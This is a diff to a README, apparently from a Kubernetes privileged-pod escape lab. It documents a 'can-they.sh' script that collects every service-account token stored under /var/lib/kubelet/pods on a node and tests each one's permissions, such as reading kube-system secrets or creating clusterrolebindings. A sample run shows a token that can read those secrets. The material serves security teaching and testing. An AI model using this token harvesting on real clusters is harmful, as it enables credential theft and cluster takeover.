@@ -172,7 +172,43 @@ echo $namespace "|" $token ; \
 done | sort
 ```
 
-**Run kubectl can-i --list against ALL tokens found on the node**
+**What does `can-they.sh` do?**
+
+* Takes the pod name and namespace as input
+* Grabs all of the tokens from `/var/lib/kubelet/pods/*` on the host
+* Loops each token against the `selfsubjectaccessreviews` endpoint: `kubectl --token=$token auth can-i [$user-input]`
+
+**Run this where you have kubectl installed, and NOT from within the priv pod.** 
+```
+(⎈ |kubernetes-admin@kubernetes:development)➜  ~ ./can-they.sh -n development -p priv-and-hostpid-exec-pod -i "get secrets -n kube-system"
+```
+
+**Run `can-they.sh`**
+```
+./can-they.sh
+./can-they.sh -i "--list -n kube-system"
+./can-they.sh -i "--list -n default"
+./can-they.sh -i "list secrets -n kube-system"
+./can-they.sh -i "create pods -n kube-system"
+./can-they.sh -i "create clusterrolebindings"
+```
+
+**Example Run on kubeadm cluster showing that the kubevol-token can list secrets in kube-system**
+```
+--------------------------------------------------------
+Token Location: /var/lib/kubelet/pods/21b0eb3f-b99e-40ed-bedf-198c77dfc101/volumes/kubernetes.io~secret/kubevol-token-xfjgv/token
+Can I get secrets -n kube-system?
+yes
+
+--------------------------------------------------------
+Token Location: /var/lib/kubelet/pods/75c4da2c-29ef-41c2-bc66-5994a690abd0/volumes/kubernetes.io~secret/default-token-qqgjc/token
+Can I get secrets -n kube-system?
+no
+...omitted for brevity...
+```
+
+
+
 
 *Run this where you have kubectl installed, and NOT from within the priv pod.*
 ```
